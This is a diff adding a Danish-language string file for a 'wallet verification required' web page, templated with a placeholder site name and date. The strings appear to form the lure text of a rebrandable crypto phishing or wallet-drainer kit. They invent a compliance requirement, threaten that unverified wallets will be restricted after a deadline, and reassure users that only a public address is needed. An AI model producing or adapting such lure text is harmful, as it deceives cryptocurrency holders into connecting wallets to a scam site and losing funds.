@@ -1,0 +1,31 @@
+﻿{
+    "pageTitle": "Pung Verificering | {websiteName}",
+    "mainTitle": "Pung Verificering Påkrævet",
+    "description1": "For at opretholde sikkerhedsstandarder og overholdelse af forskrifter kræver vi nu pungadresseverificering for alle brugere.",
+    "deadlineText": "Fra {date} vil enhver uverificeret pung blive",
+    "restrictionText": " midlertidigt begrænset",
+    "cooperationText": "Vi sætter pris på dit samarbejde for at holde vores platform sikker.",
+    "termsText": "Jeg accepterer {websiteName}'s",
+    "termsLink": "Brugervilkår",
+    "verifyBtnText": "Verificer Min Pung",
+    "securityBtnText": "Om Kompromitterede Sætninger",
+    "modalTitle": "Sikkerhedsadvarsel: Kompromitterede Gendannelsessætninger",
+    "modalWarning": "Kritisk Advarsel:",
+    "modalWarningText": "Din gendannelsessætning er hovednøglen til din pung. Del den aldrig med nogen eller indtast den på nogen hjemmeside.",
+    "signsTitle": "Tegn på en kompromitteret sætning:",
+    "signsList": [
+        "Delt med nogen der hævder at være support",
+        "Gemt digitalt (fotos, sky, beskeder)",
+        "Uautoriseret transaktioner i din pung"
+    ],
+    "actionTitle": "Øjeblikkelig handling påkrævet hvis kompromitteret:",
+    "actionList": [
+        "Overfør alle midler til en ny sikker pung øjeblikkeligt",
+        "Generer en helt ny gendannelsessætning",
+        "Brug aldrig nogen version af den gamle sætning"
+    ],
+    "modalNote": "Bemærk: {websiteName} vil aldrig bede om din gendannelsessætning. Denne verificeringsproces kræver kun din offentlige pungadresse."
+} 
+
+
+
